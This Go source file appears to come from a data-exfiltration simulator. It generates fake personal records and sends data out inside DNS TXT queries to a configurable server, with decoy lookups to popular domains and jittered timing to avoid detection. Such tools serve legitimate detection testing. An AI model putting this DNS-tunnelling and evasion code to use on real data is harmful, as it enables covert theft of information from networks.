package uploader

import (
	"encoding/base64"
	"math/rand"
	"os"
	"time"
	"fmt"
	"log"
	"net"
	"strconv"
	"strings"

	"syreclabs.com/go/faker"
	"github.com/miekg/dns"
)

var domains = []string{"google.com", "microsoft.com", "bing.com", "facebook.com", "youtube.com"}

type Data struct {
	lastname string
	firstname string
	title string
	number string
	address string
	city string
	state string
	zip string
	email string
	securityno string
}

func checkIllegalChar(domain string) string {
	return strings.Replace(domain, "=", "-", -1)
}

func dnsTXTQuery(ip string, port int, domain string, offset int, jitter float64) {
	domain = checkIllegalChar(domain)
	log.Printf("Beaconing to %s", domain)
	if ip == "0.0.0.0" {
		//IP address for DNS Server is not provided
		//Use configured local DNS Server to resolve DNS query
		net.LookupTXT(domain)
		//random dns query following exfil
		net.LookupTXT(domains[rand.Intn(len(domains))])
	} else {
		//IP address for DNS Server is provided
		c := dns.Client{}
	    m := dns.Msg{}

	    m.SetQuestion(domain + ".", dns.TypeTXT)
		c.Exchange(&m, ip + ":" + strconv.Itoa(port))
		m.SetQuestion(domains[rand.Intn(len(domains))] + ".", dns.TypeTXT)
		c.Exchange(&m, ip + ":" + strconv.Itoa(port))
	}
	sleepBeforeNextSend(offset, jitter)
}

func createPiiFile(size int) string {
	name := filename()
	f, _ := os.OpenFile(name, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0755)

	for i := 0; i < size; i++ {
		//last name, first name, title, telephone number, street address, city, state, zip, email, social security
		d := generateData()
		data := fmt.Sprintf("%s,%s,%s,%s,%s,%s,%s,%s,%s,%s\n", d.lastname, d.firstname, d.title, d.number, d.address, d.city, d.state, d.zip, d.email, d.securityno)
		f.WriteString(data)
	}

	f.Close()
	return name
}

func cleanupPiiFile(filename string) {
	os.Remove(filename)
}

func generateData() *Data {
	d := new(Data)

	d.lastname = faker.Name().LastName()
	d.firstname = faker.Name().FirstName()
	d.title = faker.Name().Title()
	d.number = faker.PhoneNumber().CellPhone()
	d.address = faker.Address().StreetAddress()
	d.city = faker.Address().City()
	d.state = faker.Address().State()
	d.zip = faker.Address().Postcode()
	d.email = faker.Internet().Email()
	d.securityno = "SXXXXXXXA"

	return d
}

// filename generates a random filename with the prefix ul_.
func filename() string {
	b := make([]byte, 6)

	rand.Seed(time.Now().Unix())
	rand.Read(b)

	return "ul_" + base64.StdEncoding.EncodeToString(b)
}

// Save the given data as a file.
func save(data []byte) string {
	name := filename()
	f, err := os.OpenFile(name, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0755)
	if err != nil {
		return ""
	}

	f.Write(data)
	f.Close()

	return name
}

// sleep for beacon interval varied by jitter percentage
func sleepBeforeNextSend(c_offset int, c_jitter float64) {
	jitter := time.Duration(0)

	if c_jitter != 0.0 {
		jitter = ( time.Duration(c_offset) + time.Duration(float64(c_offset)*c_jitter*(2*rand.Float64()-1)) ) * time.Second
	} else {
		jitter = time.Duration(c_offset) * time.Second
	}
	
	time.Sleep(jitter)
}